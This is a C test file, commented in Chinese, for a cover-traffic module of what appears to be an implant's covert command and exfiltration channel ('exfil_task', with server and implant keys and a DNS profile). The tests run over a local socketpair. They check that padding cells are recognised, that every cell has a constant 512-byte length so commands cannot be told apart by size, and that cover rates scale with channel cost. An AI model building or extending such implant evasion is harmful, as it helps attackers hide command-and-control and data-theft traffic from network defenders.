/* test_task_cover.c — 任务通道覆盖流量：真进程 + 真 socketpair */
#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_task_cover.h"
#include "p2p_cell.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>

static int pass = 0, fail = 0;

#define CHECK(cond, msg) do { \
    if (cond) { printf("[PASS] %s\n", msg); pass++; } \
    else      { printf("[FAIL] %s\n", msg); fail++; } \
} while (0)

/* 子进程收包统计，经 pipe 回报 */
typedef struct { int n_pad; int n_cmd; int n_err; uint64_t last_seq; } stats_t;

/* 方向密钥：服务端 ks=KA kr=KB；植入体 ks=KB kr=KA */
static const uint8_t KA[16] = {0xA0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xD,0xE,0xF};
static const uint8_t KB[16] = {0xB0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xD,0xE,0xF};
static const uint8_t PFX[8] = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08};

static int mk_cmd(exfil_task_cmd_t *c, uint8_t op, uint64_t id) {
    memset(c, 0, sizeof(*c));
    c->opcode  = op;
    c->task_id = id;
    return 0;
}

/*
 * 收端子进程：循环读信元，区分 PAD / 命令 / 错误，直到对端关闭。
 * 结果经 pipefd 写回父进程。
 */
static void child_recv(exfil_task_chan_t *ch, int fd, int pipefd) {
    stats_t st; memset(&st, 0, sizeof(st));

    for (;;) {
        uint64_t seq = 0;
        exfil_task_cmd_t c;
        int r = exfil_task_chan_recv_cmd(ch, fd, &seq, &c);
        if (r == EXF_TASK_PAD) {
            st.n_pad++;
            continue;
        }
        if (r == EXF_TASK_OK) {
            st.n_cmd++;
            st.last_seq = seq;
            continue;
        }
        /* CLOSED 或其它：结束 */
        st.n_err++;
        break;
    }

    ssize_t w = write(pipefd, &st, sizeof(st));
    (void)w;
    close(pipefd);
    _exit(0);
}

/* ---------- 用例 ---------- */

static void test_arg(void) {
    exfil_task_cover_t tc;
    exfil_task_chan_t  ch;
    CHECK(exfil_task_cover_init(NULL, 0, 1000, 0, 0) == EXF_TASK_COVER_ERR_ARG, "init 空指针被拒");
    CHECK(exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 60000, 0, 0) == EXF_TASK_COVER_OK, "init 正常成功");
    CHECK(tc.period_ms == EXF_TASK_COVER_PERIOD_MS, "period_ms 为 0 取默认值 500");

    exfil_task_chan_init(&ch, KA, KB, PFX);
    CHECK(exfil_task_cover_tick(NULL, &tc, 1, 5000, NULL) == EXF_TASK_COVER_ERR_ARG, "tick 空 chan 被拒");
    CHECK(exfil_task_cover_tick(&ch, NULL, 1, 5000, NULL) == EXF_TASK_COVER_ERR_ARG, "tick 空 cover 被拒");
    CHECK(exfil_task_cover_burst(&ch, &tc, -1) == EXF_TASK_COVER_ERR_ARG, "burst 非法 fd 被拒");
    exfil_task_chan_wipe(&ch);
    exfil_task_cover_wipe(&tc);
}

/* 核心：覆盖信元被识别为 PAD，且不被当成命令/错误 */
static void test_pad_recognized(void) {
    int sp[2]; if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }
    int pfd[2]; if (pipe(pfd) != 0) { CHECK(0, "pipe"); return; }

    exfil_task_chan_t  srv, imp;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 60000, 0, 0);

    pid_t pid = fork();
    if (pid == 0) {
        close(sp[0]); close(pfd[0]);
        child_recv(&imp, sp[1], pfd[1]);
    }
    close(sp[1]); close(pfd[1]);

    /* 发 3 个覆盖信元 */
    int rc = 0;
    for (int i = 0; i < 3; i++) rc |= exfil_task_chan_cover(&srv, sp[0]);
    CHECK(rc == EXF_TASK_OK, "send_cover 连发 3 个成功");

    close(sp[0]);
    stats_t st; memset(&st, 0, sizeof(st));
    ssize_t got = read(pfd[0], &st, sizeof(st));
    close(pfd[0]);
    waitpid(pid, NULL, 0);

    CHECK(got == (ssize_t)sizeof(st), "子进程回报统计完整");
    CHECK(st.n_pad == 3, "3 个覆盖信元均被识别为 PAD（非命令、非错误）");
    CHECK(st.n_cmd == 0, "覆盖信元未误报为命令");

    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* 覆盖不动 seq：连发覆盖后，命令 seq 从任意值起仍被接受 */
static void test_pad_no_seq(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    int pfd[2]; if (pipe(pfd) != 0) { CHECK(0, "pipe"); return; }

    exfil_task_chan_t  srv, imp;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 60000, 0, 0);

    pid_t pid = fork();
    if (pid == 0) { close(sp[0]); close(pfd[0]); child_recv(&imp, sp[1], pfd[1]); }
    close(sp[1]); close(pfd[1]);

    for (int i = 0; i < 5; i++) exfil_task_chan_cover(&srv, sp[0]);

    /* 覆盖之后发一条真实命令，seq=7（说明覆盖没有消耗应用层序号） */
    exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_STOP, 7);
    int r = exfil_task_chan_cmd(&srv, sp[0], 7, &c);
    CHECK(r == EXF_TASK_OK, "覆盖后发真实命令成功");

    close(sp[0]);
    stats_t st; memset(&st, 0, sizeof(st));
    ssize_t g2 = read(pfd[0], &st, sizeof(st)); (void)g2; close(pfd[0]);
    waitpid(pid, NULL, 0);

    CHECK(st.n_pad == 5, "5 个覆盖被识别");
    CHECK(st.n_cmd == 1, "1 条命令被解出");
    CHECK(st.last_seq == 7, "命令 seq=7 原样保留（覆盖未消耗应用层序号）");

    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* tick 未到期不发、到期发 */
static void test_tick_timing(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    exfil_task_chan_t  srv, imp;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);
    /* 预算 60KB/min，直连 552B/信元 -> 约 108 信元/分钟 */
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 60000, 500, 1000);

    size_t n = 999;
    int r = exfil_task_cover_tick(&srv, &tc, sp[0], 1200, &n);  /* 未到期(200<500) */
    CHECK(r == EXF_TASK_COVER_OK && n == 0, "未到期不发覆盖（n=0 是正常而非错误）");

    n = 0;
    r = exfil_task_cover_tick(&srv, &tc, sp[0], 2000, &n);      /* 到期 1000ms */
    CHECK(r == EXF_TASK_COVER_OK && n >= 1, "到期后产出覆盖信元");
    printf("[INFO] 1000ms 到期产出覆盖信元数=%zu 速率=%u/分钟\n",
           n, exfil_task_cover_rate(&tc));

    close(sp[0]); close(sp[1]);
    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* 低速余量累积：极低速下多次 tick 最终仍能凑出一个信元（不恒为 0） */
static void test_low_rate_credit(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    exfil_task_chan_t  srv;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    /*
     * 极低速：2 信元/分钟（= 2 * 552 B/信元 = 1104 B/分钟）。
     * 注意不能用 budget=1 —— 1/552 整数除法归零会让 rate 变成 0，
     * 那是"明确禁用"而非"低速"，测不到余量累积。
     */
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 1104, 500, 0);
    exfil_task_cover_set_bounds(&tc, 2, 600);
    printf("[INFO] 低速速率=%u/分钟\n", exfil_task_cover_rate(&tc));

    size_t total = 0;
    uint32_t t = 0;
    /* 2/分钟 -> 凑满 1 个信元需 30 秒；跑 120 片(60秒) 期望 >=1 */
    for (int i = 0; i < 120; i++) {
        t += 500;
        size_t n = 0;
        exfil_task_cover_tick(&srv, &tc, sp[0], t, &n);
        total += n;
    }
    printf("[INFO] 低速 120 次 tick(共 60s) 累计覆盖=%zu\n", total);
    CHECK(total >= 1, "极低速下余量累积仍能凑出覆盖信元（整除归零已解决）");

    close(sp[0]); close(sp[1]);
    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* 预算 0 明确禁用 */
static void test_budget_zero(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    exfil_task_chan_t  srv;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 0, 500, 0);

    size_t n = 999;
    int r = exfil_task_cover_tick(&srv, &tc, sp[0], 5000, &n);
    CHECK(r == EXF_TASK_COVER_OK && n == 0, "预算 0 明确禁用覆盖（不发信元）");

    close(sp[0]); close(sp[1]);
    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* 换信道画像：DNS 成本高，覆盖速率应低于直连 */
static void test_profile_scale(void) {
    exfil_task_cover_t a, b;
    exfil_task_cover_init(&a, P2P_COVER_PROFILE_DIRECT, 60000, 0, 0);
    exfil_task_cover_init(&b, P2P_COVER_PROFILE_DNS,    60000, 0, 0);
    uint32_t ra = exfil_task_cover_rate(&a), rb = exfil_task_cover_rate(&b);
    printf("[INFO] 同预算下 直连=%u/分钟 DNS=%u/分钟\n", ra, rb);
    CHECK(rb < ra, "DNS 信道成本高，覆盖速率低于直连（低速信道不被打满）");

    /* 实测成本回填（此前实测 DNS 真实成本 2854 高于画像默认 2040） */
    exfil_task_cover_set_cost(&b, 2854);
    uint32_t rb2 = exfil_task_cover_rate(&b);
    printf("[INFO] 回填实测成本 2854 后 DNS=%u/分钟\n", rb2);
    CHECK(rb2 <= rb, "回填更高实测成本后覆盖速率进一步下调");

    exfil_task_cover_wipe(&a);
    exfil_task_cover_wipe(&b);
}

/* 对端关闭 -> IO 错误（不是静默成功） */
static void test_closed(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    exfil_task_chan_t  srv;
    exfil_task_cover_t tc;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_cover_init(&tc, P2P_COVER_PROFILE_DIRECT, 6000000, 0, 0);
    close(sp[1]);   /* 对端关闭 */

    int r = exfil_task_cover_tick(&srv, &tc, sp[0], 5000, NULL);
    CHECK(r == EXF_TASK_COVER_ERR_IO, "对端关闭时 tick 返回 IO 错误（不静默成功）");

    close(sp[0]);
    exfil_task_chan_wipe(&srv);
    exfil_task_cover_wipe(&tc);
}

/* 恒长取证：覆盖信元线上同样 512 字节 */
static void test_constant_wire(void) {
    int sp[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sp);
    exfil_task_chan_t srv;
    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_cover(&srv, sp[0]);

    uint8_t buf[P2P_CELL_WIRE];
    size_t got = 0;
    /* 直接读原始字节，验证线上长度恒定 */
    /* 写端是 sp[0]，必须读 sp[1] —— socketpair 是全双工，读自己的写端会永久阻塞 */
    ssize_t n = read(sp[1], buf, sizeof(buf));
    if (n > 0) got = (size_t)n;
    CHECK(got == P2P_CELL_WIRE, "覆盖信元线上长度恒为 512（与命令不可按长度区分）");

    close(sp[0]); close(sp[1]);
    exfil_task_chan_wipe(&srv);
}

int main(void) {
    printf("=== test_task_cover ===\n");
    test_arg();
    test_pad_recognized();
    test_pad_no_seq();
    test_tick_timing();
    test_low_rate_credit();
    test_budget_zero();
    test_profile_scale();
    test_closed();
    test_constant_wire();
    printf("=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
